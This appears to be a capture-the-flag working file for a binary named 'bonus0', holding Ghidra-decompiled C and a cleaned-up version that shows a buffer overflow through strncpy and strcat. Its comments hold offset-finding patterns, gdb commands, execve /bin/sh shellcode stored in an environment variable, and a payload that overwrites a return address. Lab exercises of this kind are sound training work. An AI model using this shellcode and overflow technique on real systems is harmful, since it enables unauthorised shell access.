#include <stdint.h>

typedef int undefined4;
typedef unsigned int uint;

typedef uint8_t byte

/* Decompiled using Ghidra */

undefined4 main(void)
{
	char local_3a [54];
	
	pp(local_3a);
	puts(local_3a);
	return 0;
}

void p(char *param_1,char *param_2)
{
	char *pcVar1;
	char local_100c [4104];
	
	puts(param_2);
	read(0,local_100c,0x1000);
	pcVar1 = strchr(local_100c,10);
	*pcVar1 = '\0';
	strncpy(param_1,local_100c,0x14);
	return;
}

void pp(char *param_1)
{
	char cVar1;
	uint uVar2;
	char *pcVar3;
	byte bVar4;
	char local_34 [20];
	char local_20 [20];
	
	bVar4 = 0;
	p(local_34,&DAT_080486a0);
	p(local_20,&DAT_080486a0);
	strcpy(param_1,local_34);
	uVar2 = 0xffffffff;
	pcVar3 = param_1;
	do {
	if (uVar2 == 0) break;
	uVar2 = uVar2 - 1;
	cVar1 = *pcVar3;
	pcVar3 = pcVar3 + (uint)bVar4 * -2 + 1;
	} while (cVar1 != '\0');
	(param_1 + (~uVar2 - 1))[0] = ' ';
	(param_1 + (~uVar2 - 1))[1] = '\0';
	strcat(param_1,local_20);
	return;
}

void frame_dummy(void)
{
	return;
}


/* === readable version === */

undefined4 main(void)
{
	char output_string[54];
	
	pp(output_string);
	puts(output_string);
	return 0;
}

void p(char *dest,char *prompt)
{
	char *pcVar1;
	char local_100c [4104];

	puts(prompt);
	read(0,local_100c,4096);
	pcVar1 = strchr(local_100c, '\n');
	*pcVar1 = '\0';
	strncpy(dest,local_100c,20);
	return;
}

void pp(char *param_1)
{
	uint uVar2;
	char local_34 [20];
	char local_20 [20];

	p(local_34, " -");
	p(local_20, " -");
	strcpy(param_1,local_34);
	uVar2 = strlen(param_1);
	param_1[uVar2] = ' ';
	param_1[uVar2 + 1] = '\0';
	strcat(param_1, local_20);
	return;
}

void frame_dummy(void)
{
	return;
}


// (cat <(python -c 'print("auth a\n"); print("service pastequepasteque\n");') -) | ./bonus0

// 01234567890123456789
// Aa0Aa1Aa2Aa3Aa4Aa5Aa
// 6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag

/* 
aaaaa-----bbbbb-----ccccc-----ddddd-----

-
Aa0Aa1Aa2Aa3Aa4Aa5Aa
Aa0Aa1Aa2\xff\xff\xff\xff

Aa0Aa1Aa2Aa3A
*/

/* 
run < <(python2 -c 'import sys; print "Aa0Aa1Aa2Aa3Aa4Aa5Aa00\n"; sys.stdout.write("Aa0Aa1Aa2" + "\xff\xff\xff\xff\n")')
run < <(python2 -c 'import sys; print "Aa0Aa1Aa2Aa3Aa4Aa5Aa00\n"; sys.stdout.write("Aa0Aa1Aa2" + "\xff\xff\xff\xff\n")')
*/

/* 
echo -e "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" > shellcode.bin
export SHELLCODE=$(cat shellcode.bin)
*/

/* 
python -c "print '0' *4095 + '\n' + 'a'*9 + '\xa6\xf8\xff\xbf'" > /tmp/payload
*/
